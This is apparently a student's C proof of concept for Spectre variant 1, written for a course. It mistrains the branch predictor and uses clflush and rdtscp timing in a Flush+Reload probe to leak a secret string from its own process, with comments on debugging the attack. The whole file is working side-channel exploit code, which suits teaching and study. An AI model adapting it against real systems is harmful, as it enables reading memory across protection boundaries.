/*********************************************************************
*
* Spectre PoC
*
**********************************************************************/

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include "fcntl.h"
// #include "sched.h"
// #include "pthread.h"
#include "unistd.h"
#include "inttypes.h"

/********************************************************************
Victim code.
********************************************************************/
unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[16] = {
  1,
  2,
  3,
  4,
  5,
  6,
  7,
  8,
  9,
  10,
  11,
  12,
  13,
  14,
  15,
  16
};
uint8_t unused2[64];
uint8_t array2[256 * 512]={0};

char * secret = "abcdefghijklmnopq.";

uint8_t temp = 0;



void victim_function(size_t x){
  if (x < array1_size) {
    temp &= array2[array1[x] * 512];
  }
}


static inline uint32_t rdtscp()
{
    uint32_t rv;
    asm volatile("rdtscp" : "=a"(rv)::"edx", "ecx");
    return rv;

}


static inline uint64_t rdtscp64()
{
    uint32_t low, high;
    asm volatile("rdtscp" : "=a" (low), "=d" (high) :: "ecx");
    return (((uint64_t)high) << 32) | low;
}


/********************************************************************
Analysis code
********************************************************************/


/*
 * the code for flushing an address from cache to memory
 * the input is a pointer
 */
static inline void flush(void* addr)
{
    asm volatile("clflush 0(%0)": : "r" (addr):);
}



/*
 * the code for loading an address and timing the load
 * the output of this function is the time in CPU cycles
 * the input is a pointer
 */
static inline uint32_t memaccesstime(void *v) {
  uint32_t rv;
  asm volatile("mfence\n"
               "lfence\n"
               "rdtscp\n"
               "mov %%eax, %%esi\n"
               "mov (%1), %%eax\n"
               "rdtscp\n"
               "sub %%esi, %%eax\n"
               : "=&a"(rv)
               : "r"(v)
               : "ecx", "edx", "esi");
  return rv;
}


unsigned int array2_size = 256 * 512;

void flushArray2() {
  // Someone said shuffling the indices for flush helped? Give that a try.

  for (int j=0; j<array2_size; j+=16) { // Originally had += 64, but Prof. said 16 should be used because it's going by intervals of 4. array2 is made of uint8_t though, so if this isn't working it might actually be 8, but I could just be misunderstanding. Original Spectre authors used 512.
    flush(&array2[j]);
    asm volatile("mfence");
    asm volatile("lfence");
  }
  flush(&array2);
  asm volatile("mfence");
  asm volatile("lfence");
}

int shuffle_index(int i) {
  return (((i * 167) + 13) & 255) * 512;
}
int shuffle_index_targeted(int i) { // Targets a smaller range of indices that should include those in the secret. Was not helpful in testing, so it's just sitting here doing nothing now.
  return ((((i * 167) + 13) & 67) + 46) * 512;
}

char getByte(int i) {
  // Specifically, in the main function, you need to do three things:
  FILE *datafile = fopen("latency-data.txt", "w");
  FILE *indexfile = fopen("index-file.txt", "w");
  uint32_t access_time = 0;
  uint32_t min_access = INT32_MAX;
  unsigned int secret_index = 0;
  uint8_t secret_value = 0;
  int training_loops = 10;
  size_t attack_index = (size_t)(secret - (char *)array1) + i;
  /* Okay actually what the heck. I was using 16 + 64 + (256 * 512) + i as the
    attack index this whole time based on being told the arrays would be arranged
    in order in physical memory. This made total sense, and then after agonizing
    over why my code wasn't working for another several days and spending the last
    day before the deadline painstakingly comparing my code with the code from the
    original Spectre paper to understand what important differences could be causing
    an issue, and then finally ending up at a total loss because they seemed to be
    functionally doing the same thing, I noticed they used a different method to
    get the attack index. At this point it's literally the only part of the code
    from the original paper that I'm not 100% sure I understand, but apparently it's
    all my code needed to work this entire time. Anyway, I guess my code works now, 
    so that's cool!
  */
  size_t training_index = 1;
  size_t index = 0;
  int number_correct = 0;
  int frequency[256] = {0};

  int j = 0;
  
  // 1. Flush array2 and mistrain the branch predictor.
  asm volatile("lfence");
  asm volatile("mfence");

  // 2. Call victim_func and give an “appropriate” x so that victim_func will speculatively load one byte of the secret string.

  for (int tests=100; tests>0; tests--) {
    min_access = INT32_MAX;
    /* OG Spectre only flushes array2 and array1_size, so other flushes probably aren't helpful. */
    flushArray2();
    training_index = tests % array1_size;
    for (j=1; j<=training_loops * 5; j++) {
      flush(&array1_size);
      asm volatile("lfence");
      asm volatile("mfence");
      index = ((j % training_loops) - 1) & ~0xFFFF; // Sets index = 0 for all except when j % training_loops = 0, when it will equal 0xFFFF0000.
      // printf("%x -> ", index);
      index = (index | index >> 16);  // Bit-shifts and ORs index so 0xFFFF0000 will become 0xFFFFFFFF (i.e., -1), and 0 will stay 0.
      // printf("%x -> ", index);
      index = (index * training_index) + training_index + (index & attack_index); // Sets index to training_index if index = -1, and attack_index otherwise.
      /* How the original Spectre authors did it (gives same result, but harder to wrap head around):
      index = training_index ^ (index & (attack_index ^ training_index)); */
      // printf("%x\n", index);

      victim_function(index);
    }
    
    // 3. Reload all the entries in array2 and determine the secret value.

    /* SHUFFLED PROBING */
    for (j=0; j<256; j++) { // Relevant range should be 46 (.) through 113 (q).
      asm volatile("lfence");
      asm volatile("mfence");
      int shuffled_index = shuffle_index(j);
      access_time = memaccesstime(&array2[shuffled_index]);
      fprintf(datafile, "%u\n", access_time);
      fprintf(indexfile, "%d\n", shuffled_index);
      if (access_time < min_access) {
        min_access = access_time;
        secret_index = shuffled_index;
      }
    }

    secret_value = secret_index / 512;
    if (min_access < 100 && secret_value > 31) // Filtering out non-readable characters that tend to create noise.
      frequency[secret_value]++;
    if (secret_value == (uint8_t)secret[i])
      number_correct++;
    
  }

  uint8_t most_common = 0;
  int max_frequency = 0;
  for (j=0; j<256; j++) {
    if (frequency[j] > max_frequency) {
      max_frequency = frequency[j];
      most_common = j;
    }
  }

  secret_value = most_common;

  printf("Calculated secret value: %u (%c) (frequency: %d)\n", secret_value, (char)secret_value, frequency[secret_value]);
  printf("    Actual secret value: %u (%c)\n", (uint8_t)secret[i], secret[i]);
  printf("%d/100 correct.\n\n", number_correct);

  // 4. Repeat the above three steps to leak the entire secret string (without directly accessing it).
  return secret_value;
}

int main()
{
  // Prof. says excessive for loops + if/else statements can pollute branch predictor training.

  for (int i=0; i<array2_size; i++) {
    array2[i] = i;
  }

  char calculated_secret[18] = {0};

  // Cutting an avoidable for loop down here just in case it could somehow mess with the branch predictor.
  calculated_secret[0] = getByte(0);
  calculated_secret[1] = getByte(1);
  calculated_secret[2] = getByte(2);
  calculated_secret[3] = getByte(3);
  calculated_secret[4] = getByte(4);
  calculated_secret[5] = getByte(5);
  calculated_secret[6] = getByte(6);
  calculated_secret[7] = getByte(7);
  calculated_secret[8] = getByte(8);
  calculated_secret[9] = getByte(9);
  calculated_secret[10] = getByte(10);
  calculated_secret[11] = getByte(11);
  calculated_secret[12] = getByte(12);
  calculated_secret[13] = getByte(13);
  calculated_secret[14] = getByte(14);
  calculated_secret[15] = getByte(15);
  calculated_secret[16] = getByte(16);
  calculated_secret[17] = getByte(17);

  // printf("Calculated secret: %s\n", calculated_secret);
  printf("Calculated secret: ");
  for (int i=0; i<18; i++)
    printf("%c", calculated_secret[i]);
  printf("\n    Actual secret: %s\n", secret);
}